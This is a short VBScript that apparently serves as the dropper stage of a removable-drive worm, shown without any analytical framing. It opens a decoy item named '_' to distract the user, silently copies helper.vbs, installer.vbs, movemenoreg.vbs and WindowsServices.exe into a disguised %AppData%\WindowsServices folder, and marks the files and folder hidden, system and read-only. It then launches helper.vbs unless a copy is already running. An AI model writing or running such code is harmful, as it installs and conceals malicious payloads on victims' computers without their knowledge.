on error resume next
Dim  strPath, objws, objFile, strFolder, Target, destFolder, objDestFolder, AppData, ws, objmove, pfolder, objWinMgmt, colProcess, vaprocess
Set ws = WScript.CreateObject("WScript.Shell")

Target = "\WindowsServices"




'where are we?
strPath = WScript.ScriptFullName
set objws = CreateObject("Scripting.FileSystemObject")
Set objFile = objws.GetFile(strPath)
strFolder = objws.GetParentFolderName(objFile)
pfolder = objws.GetParentFolderName(strFolder)
ws.Run Chr(34) & pfolder & "\_" & Chr(34)


AppData = ws.ExpandEnvironmentStrings("%AppData%")



DestFolder = AppData & Target


if (not objws.folderexists(DestFolder)) then
	objws.CreateFolder DestFolder	
	Set objDestFolder = objws.GetFolder(DestFolder)
end if

Call moveandhide ("\helper.vbs")
Call moveandhide ("\installer.vbs")
Call moveandhide ("\movemenoreg.vbs")
Call moveandhide ("\WindowsServices.exe")
objDestFolder.Attributes = objDestFolder.Attributes + 39


sub moveandhide (name)
	if (not objws.fileexists(DestFolder & name)) then
		objws.CopyFile strFolder & name, DestFolder & "\"
		Set objmove = objws.GetFile(DestFolder & name)

		If not objmove.Attributes AND 39 then 
			objmove.Attributes = 0
			objmove.Attributes = objmove.Attributes + 39
		end if

	end if
end sub





Set objWinMgmt = GetObject("WinMgmts:Root\Cimv2")
Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name = 'wscript.exe'")

For Each objProcess In colProcess
	vaprocess = objProcess.CommandLine
		if instr(vaprocess, "helper.vbs") then
			WScript.quit
		End if
Next


ws.Run Chr(34) & DestFolder & "\helper.vbs" & Chr(34)


Set ws = Nothing
